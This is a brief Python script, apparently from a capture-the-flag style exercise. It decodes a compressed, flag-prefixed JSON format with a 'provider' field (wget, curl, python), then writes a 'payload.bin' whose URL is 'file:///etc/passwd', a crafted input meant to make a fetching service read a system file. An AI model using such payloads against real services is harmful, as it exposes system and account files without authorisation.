import json, zlib, gzip

f = b'\x00\x00\x1f\x8b\x08\x00 $\x00e\x02\xff\x016\x00\xc9\xffx\x9c\xabV*(\xca/\xcbLI-R\xb2RP*OO-Q\xd2QP*-\xca\x01q3JJ\n\x8a\xad\xf4\xf5\xd3\xf3\xf3\xd3sR\xf5\x92\xf3s\x95j\x01\x93\x10\x103\x00bQS6\x00\x00\x00'

provider = {b"\x00\x00": "wget", b"\x00\x01" : "curl", b"\x00\x02": "python"}
flags = f[:2]
data = json.loads(zlib.decompress(gzip.decompress(f[2:])))

print(flags)
print(data)

rev = {'provider': 'wget', 'url': 'file:///etc/passwd'}
data_json = json.dumps(rev)
compressed_data = gzip.compress(zlib.compress(data_json.encode()))
compressed_data = b"\x00\x00"+compressed_data

with open('payload.bin', 'wb') as file:
    file.write(compressed_data)
